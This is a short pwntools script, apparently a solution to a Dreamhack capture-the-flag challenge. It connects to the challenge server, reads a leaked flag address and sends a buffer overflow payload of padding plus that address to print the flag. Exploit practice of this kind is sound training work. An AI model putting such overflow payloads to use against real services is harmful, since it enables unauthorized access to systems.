from pwn import *

HOST = "host3.dreamhack.games"
PORT = 8820
# conn = process("./chall")
conn = remote(HOST, PORT)

conn.recvline()
conn.recvline()
conn.recvuntil(b'real flag address (mmapped address): ')

payload = b'A' * 40
payload += p64(int(conn.recvline(), base=16)) * 2
payload += p32(0)

conn.sendlineafter(b'input: ', payload)
print(conn.recvline())